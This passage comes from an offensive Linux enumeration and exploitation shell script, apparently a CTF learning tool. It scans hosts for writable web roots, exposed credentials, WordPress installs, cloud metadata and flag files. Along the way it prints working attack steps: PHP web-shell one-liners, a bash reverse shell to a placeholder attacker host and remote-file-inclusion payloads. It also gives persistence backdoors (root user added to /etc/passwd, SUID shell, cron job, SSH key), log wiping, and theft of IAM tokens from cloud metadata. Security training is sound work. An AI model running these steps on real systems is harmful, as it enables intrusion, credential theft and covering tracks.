        teach "  Token files are properly restricted (mode 0700)."
        teach "  ptrace is either restricted or disabled."
    else
        log ""
        teach "═══════════════════════════════════════════════════════════"
        teach "SUDO TOKEN HIJACKING SUMMARY"
        teach "═══════════════════════════════════════════════════════════"
        teach ""
        teach "EXPLOITATION PRIORITY:"
        teach "  1. Readable tokens (rare but instant)"
        teach "  2. Ptrace injection (more common, requires tools)"
        teach "  3. Wait for sudo activity (timing-based)"
        teach ""
        teach "DETECTION METHODS:"
        teach "  • Monitor /var/run/sudo/ts/ for new tokens"
        teach "  • Watch for sudo processes: watch -n1 'ps aux | grep sudo'"
        teach "  • Check timestamp of token files (stat)"
        teach ""
        teach "DEFENSE (as admin):"
        teach "  • Ensure /var/run/sudo/ts/ has mode 0700"
        teach "  • Set ptrace_scope=1 or higher"
        teach "  • Reduce sudo timeout (timestamp_timeout in sudoers)"
        teach "  • Use sudo -k to clear tokens after sensitive operations"
        log ""
    fi
}
# === ENHANCED WEB APPLICATION ENUMERATION ===
enum_web() {
    [ $EXTENDED -eq 0 ] && return
    
    section "WEB APPLICATION ENUMERATION"
    
    # === PHASE 1: SILENT SCAN - Collect findings ===
    local found_writable_webroot=0
    local found_writable_uploads=0
    local found_credentials=0
    local found_web_shells=0
    local found_wordpress=0
    local found_frameworks=0
    local found_logs_with_creds=0
    
    local temp_writable_roots="/tmp/.learnpeas_web_roots_$$"
    local temp_writable_uploads="/tmp/.learnpeas_web_uploads_$$"
    local temp_configs="/tmp/.learnpeas_web_configs_$$"
    local temp_shells="/tmp/.learnpeas_web_shells_$$"
    local temp_wordpress="/tmp/.learnpeas_wordpress_$$"
    local temp_frameworks="/tmp/.learnpeas_frameworks_$$"
    local temp_log_creds="/tmp/.learnpeas_log_creds_$$"
    
    # Cleanup function
    cleanup_web_temps() {
        rm -f "$temp_writable_roots" "$temp_writable_uploads" "$temp_configs" \
              "$temp_shells" "$temp_wordpress" "$temp_frameworks" "$temp_log_creds" 2>/dev/null
    }
    trap cleanup_web_temps RETURN
    
    # Check common web roots
    local web_roots=("/var/www/html" "/var/www" "/usr/share/nginx/html" "/opt")
    local checked_dirs=()
    
    for webroot in "${web_roots[@]}"; do
        # Skip if already checked this or a parent
        local skip=0
        for checked in "${checked_dirs[@]}"; do
            if [[ "$webroot" == "$checked"* ]]; then
                skip=1
                break
            fi
        done
        [ $skip -eq 1 ] && continue
        
        if [ -d "$webroot" ]; then
            checked_dirs+=("$webroot")
            
            # === CHECK 1: Writable Web Root ===
            if [ -w "$webroot" ]; then
                echo "$webroot" >> "$temp_writable_roots"
                found_writable_webroot=1
            fi
            
            # === CHECK 2: Writable Upload Directories ===
            for upload_dir in "uploads" "upload" "files" "media" "assets" "images" "attachments" "documents"; do
                local upload_path="$webroot/$upload_dir"
                if [ -d "$upload_path" ] && [ -w "$upload_path" ]; then
                    # Check if .htaccess restricts PHP execution
                    local htaccess_blocks_php=0
                    if [ -f "$upload_path/.htaccess" ]; then
                        if grep -qiE "php_flag|php_admin_flag.*off|RemoveHandler.*php|RemoveType.*php" "$upload_path/.htaccess" 2>/dev/null; then
                            htaccess_blocks_php=1
                        fi
                    fi
                    
                    echo "$upload_path|$htaccess_blocks_php" >> "$temp_writable_uploads"
                    found_writable_uploads=1
                fi
            done
            
            # === CHECK 3: Configuration Files with Credentials ===
            find "$webroot" -maxdepth 3 -type f \( -name "*.conf" -o -name "*.config" -o -name "*config*.php" \
                -o -name ".env" -o -name "*.yml" -o -name "*.yaml" -o -name "*.ini" \) 2>/dev/null | \
            grep -vE "sample|example|setup-config|default-|node_modules|vendor" | head -15 | while read config; do
                if [ -r "$config" ]; then
                    # More precise credential detection - avoid false positives
                    if grep -E "(password|passwd|secret|token|api[_-]?key)[\"']?\s*[:=]\s*[\"']?[^\"\s]{3,}" "$config" 2>/dev/null | \
                       grep -vE "^\s*[#;/]|example|sample|your_|changeme|<password>|password_here|PUT_|INSERT_|ENTER_" | head -3 | grep -q "."; then
                        local is_writable=$( [ -w "$config" ] && echo "1" || echo "0" )
                        echo "$config|$is_writable" >> "$temp_configs"
                        found_credentials=1
                    fi
                fi
            done
            
            # === CHECK 4: WordPress Detection ===
            if [ -f "$webroot/wp-config.php" ]; then
                local wp_readable=$( [ -r "$webroot/wp-config.php" ] && echo "1" || echo "0" )
                local wp_writable=$( [ -w "$webroot/wp-config.php" ] && echo "1" || echo "0" )
                local has_backups=0
                local has_xmlrpc=$( [ -f "$webroot/xmlrpc.php" ] && echo "1" || echo "0" )
                local has_json_api=$( [ -d "$webroot/wp-json" ] && echo "1" || echo "0" )
                local plugin_count=$(ls -1 "$webroot/wp-content/plugins" 2>/dev/null | wc -l)
                
                # Check for wp-config backups
                if find "$webroot" -maxdepth 1 -type f \( -name "wp-config.php.bak" -o -name "wp-config.php.old" \
                    -o -name "wp-config.php~" -o -name "wp-config.php.save" \) -readable 2>/dev/null | grep -q .; then
                    has_backups=1
                fi
                
                echo "$webroot|$wp_readable|$wp_writable|$has_backups|$has_xmlrpc|$has_json_api|$plugin_count" >> "$temp_wordpress"
                found_wordpress=1
            fi
            
            # === CHECK 5: Framework Detection ===
            # Laravel
            if [ -f "$webroot/.env" ] || [ -d "$webroot/storage" ]; then
                local env_readable=$( [ -r "$webroot/.env" ] && echo "1" || echo "0" )
                echo "Laravel|$webroot|$env_readable" >> "$temp_frameworks"
                found_frameworks=1
            fi
            
            # Django
            if [ -f "$webroot/manage.py" ] || find "$webroot" -maxdepth 2 -name "settings.py" 2>/dev/null | grep -q .; then
                local settings_file=$(find "$webroot" -maxdepth 3 -name "settings.py" -readable 2>/dev/null | head -1)
                local has_secrets=$( [ -n "$settings_file" ] && grep -qE "SECRET_KEY|DATABASE|PASSWORD" "$settings_file" 2>/dev/null && echo "1" || echo "0" )
                echo "Django|$webroot|$settings_file|$has_secrets" >> "$temp_frameworks"
                found_frameworks=1
            fi
            
            # Node.js/Express
            if [ -f "$webroot/package.json" ]; then
                local has_env=$( [ -r "$webroot/.env" ] && echo "1" || echo "0" )
                echo "Node.js|$webroot|$has_env" >> "$temp_frameworks"
                found_frameworks=1
            fi
            
            # Rails
            if [ -d "$webroot/config" ] && [ -f "$webroot/config.ru" ]; then
                local db_readable=$( [ -r "$webroot/config/database.yml" ] && echo "1" || echo "0" )
                echo "Rails|$webroot|$db_readable" >> "$temp_frameworks"
                found_frameworks=1
            fi
            
            # === CHECK 6: Web Server Logs with Credentials (only once, not per webroot) ===
            # Skip this check if we already processed logs
            if [ "$webroot" = "/var/www/html" ] || [ "$webroot" = "/var/www" ]; then
                for logfile in "/var/log/apache2/access.log" "/var/log/nginx/access.log" "$webroot/../logs/access.log"; do
                    if [ -r "$logfile" ]; then
                        # Check if already processed
                        if [ -f "$temp_log_creds" ] && grep -q "^$logfile$" "$temp_log_creds" 2>/dev/null; then
                            continue
                        fi
                        
                        # Look for credentials in GET parameters
                        if grep -E "(password|passwd|pwd|token|api_key)=[^& ]{3,}" "$logfile" 2>/dev/null | grep -v "password=\*\*\*\*" | tail -3 | grep -q "."; then
                            echo "$logfile" >> "$temp_log_creds"
                            found_logs_with_creds=1
                        fi
                    fi
                done
            fi
            
            # === CHECK 7: Web Shell Detection (Improved) ===
            local safe_patterns="class-phpmailer\.php|class-smtp\.php|class-ftp\.php|class-ftp-sockets\.php|"
            safe_patterns+="file\.php.*wp-admin|Filesystem\.php|Process\.php|vendor/|node_modules/|"
            safe_patterns+="wp-includes/.*\.php|laravel/framework"
            
            find "$webroot" -maxdepth 3 -type f \( -name "*.php" -o -name "*.phtml" \) 2>/dev/null | \
            grep -vE "$safe_patterns" | while read phpfile; do
                local filesize=$(stat -c%s "$phpfile" 2>/dev/null || echo "0")
                
                # Skip very large files (likely legitimate)
                [ $filesize -gt 1000000 ] && continue
                
                # Check for web shell signatures with context
                local suspicious_count=0
                local has_eval=$(grep -c "eval(" "$phpfile" 2>/dev/null | head -1)
                local has_base64=$(grep -c "base64_decode" "$phpfile" 2>/dev/null | head -1)
                local has_system=$(grep -c "system(" "$phpfile" 2>/dev/null | head -1)
                local has_exec=$(grep -c "exec(" "$phpfile" 2>/dev/null | head -1)
                local has_shell_exec=$(grep -c "shell_exec(" "$phpfile" 2>/dev/null | head -1)
                local has_passthru=$(grep -c "passthru(" "$phpfile" 2>/dev/null | head -1)
                
                # Ensure all values are numeric (handle empty strings)
                has_eval=${has_eval:-0}
                has_base64=${has_base64:-0}
                has_system=${has_system:-0}
                has_exec=${has_exec:-0}
                has_shell_exec=${has_shell_exec:-0}
                has_passthru=${has_passthru:-0}
                
                # Score the file
                suspicious_count=$((has_eval + has_base64 + has_system + has_exec + has_shell_exec + has_passthru))
                
                # High confidence: Multiple dangerous functions or eval+base64 combo
                if [ $suspicious_count -ge 4 ] || { [ $has_eval -gt 0 ] && [ $has_base64 -gt 1 ]; }; then
                    # Additional check: Look for common web shell indicators (escape $ properly)
                    if grep -qE "c99|r57|b374k|wso|shell|backdoor|\\$_(GET|POST|REQUEST)" "$phpfile" 2>/dev/null; then
                        echo "$phpfile|high|$suspicious_count" >> "$temp_shells"
                        found_web_shells=1
                    fi
                # Medium confidence: 3 dangerous functions
                elif [ $suspicious_count -eq 3 ]; then
                    if grep -qE "\\$_(GET|POST|REQUEST).*(system|exec|eval)" "$phpfile" 2>/dev/null; then
                        echo "$phpfile|medium|$suspicious_count" >> "$temp_shells"
                        found_web_shells=1
                    fi
                fi
            done
        fi
    done
    
    # === PHASE 2: CONDITIONAL EDUCATION (only if issues found) ===
    local any_issues=$((found_writable_webroot + found_writable_uploads + found_credentials + \
                        found_web_shells + found_wordpress + found_frameworks + found_logs_with_creds))
    
    if [ $any_issues -gt 0 ]; then
        explain_concept "Web Application Attacks" \
            "Web applications often store credentials, have writable directories, or run with elevated privileges." \
            "Common issues: hardcoded credentials in config files, writable web roots allowing shell upload, database credentials, API tokens, LFI/RFI vulnerabilities, existing backdoors from previous compromises." \
            "Where to look:\n  • /var/www/html - Default web root\n  • /var/www - Alternative location\n  • /opt/* - Custom applications\n  • Look for: config.php, .env, wp-config.php, database.yml\n  • Upload directories\n  • Existing web shells"
    fi
    
    # === PHASE 3: REPORT SPECIFIC FINDINGS ===
    
    # Report writable web roots
    if [ -f "$temp_writable_roots" ]; then
        while IFS= read -r webroot; do
            critical "Web root WRITABLE - Upload shell for remote code execution"
            vuln "Web root is WRITABLE: $webroot"
            log ""
            teach "╔═══════════════════════════════════════╗"
            teach "║  Writable Web Root Exploitation"
            teach "╚═══════════════════════════════════════"
            teach ""
            teach "WHAT YOU CAN DO:"
            teach "  Upload a web shell to execute commands through the browser"
            teach ""
            teach "EXPLOITATION:"
            teach "  1. Create simple PHP shell:"
            teach "     echo '<?php system(\$_GET[\"cmd\"]); ?>' > $webroot/shell.php"
            teach ""
            teach "  2. Make it hidden:"
            teach "     echo '<?php system(\$_GET[\"c\"]); ?>' > $webroot/.shell.php"
            teach ""
            teach "  3. Access via web:"
            teach "     curl http://localhost/shell.php?cmd=whoami"
            teach ""
            teach "  4. Upgrade to reverse shell:"
            teach "     curl 'http://localhost/shell.php?cmd=bash+-c+\"bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261\"'"
            log ""
        done < "$temp_writable_roots"
    fi
    
    # Report writable upload directories
    if [ -f "$temp_writable_uploads" ]; then
        while IFS='|' read -r upload_path htaccess_blocks; do
            if [ "$htaccess_blocks" = "1" ]; then
                warn "Upload directory writable but .htaccess may block PHP: $upload_path"
                teach "  .htaccess restricts PHP execution - check if it can be bypassed"
            else
                critical "Upload directory WRITABLE with PHP execution: $upload_path"
                vuln "Writable upload directory: $upload_path"
                log ""
                teach "╔═══════════════════════════════════════╗"
                teach "║  Upload Directory Exploitation"
                teach "╚═══════════════════════════════════════"
                teach ""
                teach "BYPASS TECHNIQUES:"
                teach "  1. Direct upload if no .htaccess:"
                teach "     echo '<?php system(\$_GET[\"c\"]); ?>' > $upload_path/shell.php"
                teach ""
                teach "  2. If .php blocked, try alternate extensions:"
                teach "     • .php3, .php4, .php5, .phtml, .phar"
                teach "     • shell.php.jpg (double extension bypass)"
                teach "     • shell.php%00.jpg (null byte - old PHP)"
                teach ""
                teach "  3. Upload .htaccess to enable PHP:"
                teach "     echo 'AddType application/x-httpd-php .jpg' > $upload_path/.htaccess"
                teach "     Then upload shell as .jpg"
                log ""
            fi
        done < "$temp_writable_uploads"
    fi
    
    # Report configs with credentials
    if [ -f "$temp_configs" ]; then
        while IFS='|' read -r config is_writable; do
            critical "${WORK}[INTERESTING]${RST} Config contains credentials: $config"
            vuln "Configuration file with credentials: $config"
            
            # Show actual credentials (first 3 matches)
            grep -E "(password|passwd|secret|token|api[_-]?key)[\"']?\s*[:=]\s*[\"']?[^\"\s]{3,}" "$config" 2>/dev/null | \
            grep -vE "^\s*[#;/]|example" | head -3 | while read line; do
                log "    $line"
            done
            
            if [ "$is_writable" = "1" ]; then
                vuln "Config file is WRITABLE: $config"
                teach "  Modify to add backdoor credentials or change settings"
            fi
            log ""
        done < "$temp_configs"
    fi
    
    # Report WordPress installations
    if [ -f "$temp_wordpress" ]; then
        while IFS='|' read -r webroot wp_readable wp_writable has_backups has_xmlrpc has_json_api plugin_count; do
            vuln "WordPress installation: $webroot"
            
            if [ "$wp_readable" = "1" ]; then
                critical "${WORK}[INTERESTING]${RST} wp-config.php is READABLE - contains database credentials"
                vuln "WordPress config readable: $webroot/wp-config.php"
                
                # Extract and show DB credentials
                if grep -E "DB_PASSWORD|DB_USER|DB_NAME" "$webroot/wp-config.php" 2>/dev/null | grep -q "."; then
                    critical "${WORK}[INTERESTING]${RST} Database credentials in wp-config.php"
                    grep -E "DB_PASSWORD|DB_USER|DB_NAME|DB_HOST" "$webroot/wp-config.php" 2>/dev/null | grep -v "put your"
                fi
            fi
            
            if [ "$has_backups" = "1" ]; then
                critical "${WORK}[INTERESTING]${RST} wp-config backup found - may contain credentials"
                find "$webroot" -maxdepth 1 -name "wp-config.php*" ! -name "wp-config.php" -readable 2>/dev/null
            fi
            
            if [ "$has_xmlrpc" = "1" ]; then
                warn "xmlrpc.php present - enables brute force amplification"
                teach "  Test: curl -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' http://target/xmlrpc.php"
            fi
            
            if [ "$has_json_api" = "1" ]; then
                info "WordPress REST API present"
                teach "  Enumerate users: curl http://target/wp-json/wp/v2/users"
            fi
            
            if [ $plugin_count -gt 0 ]; then
                warn "Found $plugin_count installed plugins"
                ls -1 "$webroot/wp-content/plugins" 2>/dev/null | head -5 | while read plugin; do
                    log "  Plugin: $plugin"
                    if [ -f "$webroot/wp-content/plugins/$plugin/readme.txt" ]; then
                        local version=$(grep -i "stable tag" "$webroot/wp-content/plugins/$plugin/readme.txt" 2>/dev/null | head -1)
                        [ -n "$version" ] && info "  Version: $version" && teach "  Check exploit-db for: $plugin $version"
                    fi
                done
            fi
            log ""
        done < "$temp_wordpress"
    fi
    
    # Report frameworks
    if [ -f "$temp_frameworks" ]; then
        while IFS='|' read -r framework webroot extra1 extra2; do
            case "$framework" in
                Laravel)
                    if [ "$extra1" = "1" ]; then
                        critical "Laravel .env file readable: $webroot/.env"
                        vuln "Laravel .env exposed"
                    fi
                    ;;
                Django)
                    if [ "$extra2" = "1" ]; then
                        critical "Django settings contain credentials: $extra1"
                        vuln "Django settings exposed: $extra1"
                    fi
                    ;;
                Node.js)
                    if [ "$extra1" = "1" ]; then
                        critical "Node.js .env file readable"
                    fi
                    ;;
                Rails)
                    if [ "$extra1" = "1" ]; then
                        critical "Rails database.yml readable: $webroot/config/database.yml"
                        vuln "Rails database config exposed"
                    fi
                    ;;
            esac
        done < "$temp_frameworks"
    fi
    
    # Report logs with credentials
    if [ -f "$temp_log_creds" ]; then
        # Deduplicate log files
        sort -u "$temp_log_creds" | while IFS= read -r logfile; do
            warn "Access log contains credentials in URLs: $logfile"
            # Filter out CSRF tokens and other non-sensitive patterns
            grep -E "(password|passwd|pwd|api_key)=[^& ]{3,}" "$logfile" 2>/dev/null | \
            grep -vE "password=\*\*\*\*|token=[a-f0-9]{32,}" | tail -3 | while read line; do
                log "  $line"
            done
            teach "  Credentials submitted via GET are logged!"
            log ""
        done
    fi
    
    # Report web shells
    if [ -f "$temp_shells" ]; then
        while IFS='|' read -r phpfile confidence score; do
            critical "Potential web shell: $phpfile (confidence: $confidence)"
            vuln "Possible existing web shell: $phpfile"
            teach "  Suspicious function count: $score"
            teach "  Analyze: cat $phpfile | head -20"
            log ""
        done < "$temp_shells"
    fi
    
    # === PHASE 4: RUNNING WEB SERVER CHECK ===
    if netstat -tuln 2>/dev/null | grep -qE ":80 |:443 |:8080 "; then
        info "Web server is listening on common ports"
        
        # Identify web server type
        if ps aux | grep -iE "apache2|httpd" | grep -v grep | grep -q "."; then
            info "Apache web server detected"
            
            if [ $any_issues -gt 0 ]; then
                teach ""
                teach "Apache exploitation tips:"
                teach "  • Check for writable .htaccess"
                teach "  • Look for mod_cgi with writable cgi-bin"
                teach "  • Check Apache version for CVEs"
            fi
        fi
        
        if ps aux | grep -i nginx | grep -v grep | grep -q "."; then
            info "Nginx web server detected"
            
            if [ $any_issues -gt 0 ]; then
                teach ""
                teach "Nginx exploitation tips:"
                teach "  • Check nginx.conf for misconfigurations"
                teach "  • Look for path traversal via alias directive"
                teach "  • Check for writable sites-enabled configs"
            fi
        fi
        
        if [ $any_issues -gt 0 ]; then
            teach ""
            teach "General web exploitation:"
            teach "  • LFI: /index.php?page=../../../../etc/passwd"
            teach "  • RFI: /index.php?page=http://attacker/shell.txt"
            teach "  • Command injection: /script.php?file=test;whoami"
            teach "  • SQL injection in parameters"
        fi
    fi
    
    # === PHASE 5: CLEAN EXIT ===
    if [ "$any_issues" -eq 0 ]; then
        ok "No web application vulnerabilities detected"
    else
        log ""
        info "Web application enumeration complete"
        teach ""
        teach "Key web attack vectors found:"
        [ "$found_writable_webroot" -eq 1 ] 2>/dev/null && teach "  ✓ Writable web root = direct shell upload"
        [ "$found_writable_uploads" -eq 1 ] 2>/dev/null && teach "  ✓ Writable upload directories"
        [ "$found_credentials" -eq 1 ] 2>/dev/null && teach "  ✓ Config files with credentials"
        [ "$found_web_shells" -eq 1 ] 2>/dev/null && teach "  ✓ Existing web shells detected"
        [ "$found_wordpress" -eq 1 ] 2>/dev/null && teach "  ✓ WordPress installation found"
        [ "$found_frameworks" -eq 1 ] 2>/dev/null && teach "  ✓ Web frameworks detected"
    fi
}
# === POST-EXPLOITATION ===
enum_post_exploit() {
    [ $EXTENDED -eq 0 ] && return
    
    section "POST-EXPLOITATION OPPORTUNITIES"
    
    explain_concept "Post-Exploitation" \
        "After gaining initial access, establish persistence, gather credentials, and prepare for lateral movement." \
        "You might lose access (reboot, detection, session timeout). Persistence ensures you can return. Credentials enable lateral movement to other systems. Evidence should be minimized." \
        "Techniques:\n  • Backdoor accounts\n  • SSH key injection\n  • SUID shells\n  • Cron jobs\n  • Systemd services"
    
    # Check if we're root (for post-exploit suggestions)
    if [ $EUID -eq 0 ]; then
        info "Running as ROOT - post-exploitation options available"
        
        teach "Persistence techniques now available:"
        teach "  1. Add SSH key: echo 'YOUR_KEY' >> /root/.ssh/authorized_keys"
        teach "  2. Create SUID shell: cp /bin/bash /tmp/.hidden; chmod 4755 /tmp/.hidden"
        teach "  3. Add backdoor user: echo 'backdoor:\$1\$xyz\$HASH:0:0::/root:/bin/bash' >> /etc/passwd"
        teach "  4. Cron backdoor: echo '* * * * * root /tmp/.backdoor' >> /etc/crontab"
        
        teach "\nCredential harvesting:"
        teach "  • Dump /etc/shadow for offline cracking"
        teach "  • Extract SSH keys from /home/*/.ssh/"
        teach "  • Check browser saved passwords if GUI present"
        teach "  • Dump process memory for credentials: strings /proc/*/environ"
        
        teach "\nAnti-forensics:"
        teach "  • Clear logs: echo '' > /var/log/auth.log"
        teach "  • Clear history: history -c; rm ~/.bash_history"
        teach "  • Remove artifacts: rm /tmp/exploit*"
        
    else
        info "Not root yet - focus on privilege escalation first"
    fi
    
    # Network reconnaissance for lateral movement
    info "Internal network reconnaissance:"
    
    # Check for other hosts in ARP cache
    if command -v arp >/dev/null 2>&1; then
        local hosts=$(arp -a 2>/dev/null | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u | wc -l)
        if [ $hosts -gt 1 ]; then
            info "Found $hosts hosts in ARP cache"
            teach "Potential targets for lateral movement"
        fi
    fi
    
    # Check for SSH known_hosts
    find /home -name "known_hosts" 2>/dev/null | while read khosts; do
        if [ -r "$khosts" ]; then
            info "SSH known_hosts found: $khosts"
            teach "Contains previously accessed hosts - potential lateral movement targets"
        fi
    done
}

# === CTF FLAG HUNTING ===
enum_ctf_flags() {
    [ $EXTENDED -eq 0 ] && return
    [ $SHOW_FLAGS -eq 0 ] && return
    
    section "CTF FLAG HUNTING"
    
    teach "Looking for common CTF flag patterns and locations..."
    
    # Common flag patterns
    local flag_patterns=(
        "flag{.*}"
        "HTB{.*}"
        "THM{.*}"
        "CTF{.*}"
        "FLAG{.*}"
    )
    
    info "Checking common flag file locations:"
    
    # Root flags
    find /root -maxdepth 1 -name "root.txt" -o -name "flag.txt" -o -name "proof.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ]; then
            ctf_flag "ROOT FLAG READABLE: $flagfile"
            vuln "ROOT FLAG FOUND: $flagfile"
            
            if [ $SHOW_FLAGS -eq 1 ]; then
                cat "$flagfile" 2>/dev/null
            else
                info "Use --flags to reveal flag contents"
            fi
        else
            warn "Root flag exists but not readable: $flagfile"
            teach "Get root to read this file"
        fi
    done
    
    # User flags
    find /home -maxdepth 2 -name "user.txt" -o -name "flag.txt" -o -name "local.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ]; then
            ctf_flag "USER FLAG READABLE: $flagfile"
            vuln "USER FLAG FOUND: $flagfile"
            
            if [ $SHOW_FLAGS -eq 1 ]; then
                cat "$flagfile" 2>/dev/null
            else
                info "Use --flags to reveal flag contents"
            fi
        else
            warn "User flag exists but not readable: $flagfile"
            teach "Escalate to user $(stat -c %U "$flagfile" 2>/dev/null) to read this"
        fi
    done
    
    # Other flag locations
    find /var/www /opt -maxdepth 3 -name "*flag*" -o -name "*.txt" 2>/dev/null | while read flagfile; do
        if [ -r "$flagfile" ] && grep -qE "flag{|HTB{|THM{|CTF{|^[a-f0-9]{32}$" "$flagfile" 2>/dev/null; then
            ctf_flag "FLAG FOUND: $flagfile"
            vuln "FLAG FOUND: $flagfile"
            
            if [ $SHOW_FLAGS -eq 1 ]; then
                cat "$flagfile" 2>/dev/null
            else
                info "Use --flags to reveal flag contents"
            fi
        fi
    done
    
    info "Searching for flag patterns in readable files:"
    local pattern_count=0
    local total_patterns=5

    for pattern in "${flag_patterns[@]}"; do
    pattern_count=$((pattern_count + 1))
    echo -ne "\r[INFO] Checking pattern $pattern_count/$total_patterns..." >&2
    
    grep -rE "$pattern" /home /var/www /opt /tmp 2>/dev/null | grep -vE "teachpeas|learnpeas|\.log:|\.sh:" | head -5 | while read match; do
        echo -ne "\r\033[K"  # Clear progress line
        warn "Potential flag: $match"
    done
    done
    echo -ne "\r\033[K"  # Clear final progress line
    
    # Check current directory
    if ls user.txt root.txt flag.txt 2>/dev/null | grep -q .; then
        ctf_flag "FLAG FILE IN CURRENT DIRECTORY!"
        vuln "Flag file in current directory!"
        
        if [ $SHOW_FLAGS -eq 1 ]; then
            cat user.txt root.txt flag.txt 2>/dev/null
        else
            info "Use --flags to reveal flag contents"
        fi
    fi
    
    # Check for encoded flags
    info "Checking for base64-encoded flags:"
    find /home /var/www /opt -type f -readable 2>/dev/null | head -100 | while read file; do
        # Skip binary files
        if file "$file" | grep -q "text"; then
            if [ $(wc -l < "$file" 2>/dev/null) -eq 1 ]; then
               local content=$(cat "$file" 2>/dev/null)
               if echo "$content" | grep -qE "^[A-Za-z0-9+/=]{20,}$"; then
                   local decoded=$(echo "$content" | base64 -d 2>/dev/null)
                   if echo "$decoded" | grep -qE "flag{|HTB{|THM{|^[a-f0-9]{32}$"; then
                        ctf_flag "Base64-encoded flag in $file"
                        vuln "Base64-encoded flag in $file:"
                    
                        if [ $SHOW_FLAGS -eq 1 ]; then
                            echo "$decoded"
                        else
                            info "Use --flags to reveal flag contents"
                        fi
                    fi
                fi
            fi
        fi
    done
    
    # Check environment variables
    if env | grep -iE "flag|htb|thm" | grep -qv "EXTENDED|SHOW_FLAGS"; then
        info "Flag-related environment variables:"
        env | grep -iE "flag|htb|thm" | grep -v "EXTENDED\|SHOW_FLAGS"
    fi
    
    teach "\nCTF-specific hiding places:"
    teach "  • Steganography in images (use steghide, binwalk)"
    teach "  • Hidden in EXIF data (use exiftool)"
    teach "  • Encoded in environment variables"
    teach "  • In database tables"
    teach "  • In git commit history (.git/logs/HEAD)"
    teach "  • Hidden with alternate data streams (NTFS)"
    teach "  • Inside zip/tar archives"
}
# === NETWORK PIVOTING ===
enum_pivoting() {
    [ $EXTENDED -eq 0 ] && return
    
    section "NETWORK PIVOTING SETUP"
    
    explain_concept "Network Pivoting" \
        "Use compromised host as a jump point to access internal networks not directly reachable from your attack machine." \
        "Many networks have an external-facing host (DMZ) and internal hosts. Once you compromise the DMZ host, you can tunnel through it to reach internal services. Essential for multi-host CTF challenges." \
        "Common techniques:\n  • SSH tunneling (local/remote port forwarding)\n  • Chisel (SOCKS proxy over HTTP)\n  • Ligolo-ng (modern tunneling)\n  • Metasploit autoroute"
    
    # Check if we can SSH out
    if command -v ssh >/dev/null 2>&1; then
        info "SSH client available for tunneling"
        teach "SSH tunneling options:"
        teach "  Local forward: ssh -L 8080:internal_host:80 user@pivot"
        teach "  Remote forward: ssh -R 9001:localhost:443 attacker@YOUR_IP"
        teach "  Dynamic (SOCKS): ssh -D 1080 user@pivot"
    fi
    
    # Check for internal networks
    ip addr 2>/dev/null | grep -oE "inet ([0-9]{1,3}\.){3}[0-9]{1,3}" | awk '{print $2}' | while read ip; do
        local network=$(echo $ip | cut -d. -f1-3)
        
        case $network in
            192.168.*|172.16.*|172.17.*|172.18.*|172.19.*|172.20.*|172.21.*|172.22.*|172.23.*|172.24.*|172.25.*|172.26.*|172.27.*|172.28.*|172.29.*|172.30.*|172.31.*|10.*)
                info "Internal network detected: $network.0/24"
                teach "Scan this network from the compromised host:"
                teach "  for i in {1..254}; do ping -c 1 $network.\$i &>/dev/null && echo \$network.\$i; done"
                ;;
        esac
    done
    
    # Check for proxychains config
    if [ -f /etc/proxychains.conf ] || [ -f ~/.proxychains/proxychains.conf ]; then
        info "Proxychains is configured"
        teach "Use proxychains to route tools through this host"
    fi
}

# ═══════════════════════════════════════════════════
# PHASE 1: HIGH-VALUE ADDITIONS
# ═══════════════════════════════════════════════════

# === CLOUD METADATA SERVICES ===
enum_cloud_metadata() {
    section "CLOUD METADATA SERVICE ENUMERATION"
    
    explain_concept "Cloud Instance Metadata" \
        "Cloud providers expose instance metadata via HTTP endpoint. Contains credentials, SSH keys, user-data scripts." \
        "Cloud instances need to query their own metadata for configuration. AWS uses 169.254.169.254, Azure uses similar. If you're on a cloud instance, this endpoint contains IAM credentials, API keys, bootstrap scripts with passwords." \
        "Access:\n  AWS: curl http://169.254.169.254/latest/meta-data/\n  Azure: curl -H 'Metadata:true' http://169.254.169.254/metadata/instance?api-version=2021-02-01\n  GCP: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"
    
    # Check if we can reach cloud metadata
    if command -v curl >/dev/null 2>&1; then
        # AWS Check
        if timeout 2 curl -s -f http://169.254.169.254/latest/meta-data/ >/dev/null 2>&1; then
            critical "AWS METADATA ACCESSIBLE - Steal IAM credentials for cloud access"
            vuln "AWS EC2 Metadata Service is ACCESSIBLE!"
            info "Instance metadata available at: http://169.254.169.254/latest/meta-data/"
            
            teach "AWS Metadata exploitation:"
            teach "  1. Get IAM role: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            teach "  2. Get credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
            teach "  3. Get user-data (bootstrap script): curl http://169.254.169.254/latest/user-data"
            teach "  4. Use credentials with AWS CLI for lateral movement"
            
            # Try to get actual creds
            local role=$(timeout 2 curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)
            if [ -n "$role" ]; then
                critical "IAM Role found: $role - Extract credentials immediately"
                vuln "IAM Role found: $role"
                teach "Retrieve credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$role"
            fi
        fi
        
        # Azure Check
        if timeout 2 curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null | grep -q "compute"; then
            critical "Azure metadata accessible - Extract managed identity tokens"
            vuln "Azure Instance Metadata Service is ACCESSIBLE!"
            teach "Azure Metadata exploitation:"
            teach "  curl -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
            teach "  May contain managed identity tokens"
        fi
        
        # GCP Check
        if timeout 2 curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" 2>/dev/null | grep -q "."; then
            critical "GCP metadata accessible - Extract service account tokens"
            vuln "GCP Metadata Service is ACCESSIBLE!"
            teach "GCP Metadata exploitation:"
            teach "  curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/"
            teach "  Get service account token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        fi
    else
        info "curl not available - cannot check cloud metadata"
    fi
}

# === LANGUAGE-SPECIFIC CREDENTIAL HUNTING ===
enum_language_creds() {
    section "LANGUAGE-SPECIFIC CREDENTIAL DISCOVERY"
    
    explain_concept "Framework Credentials" \
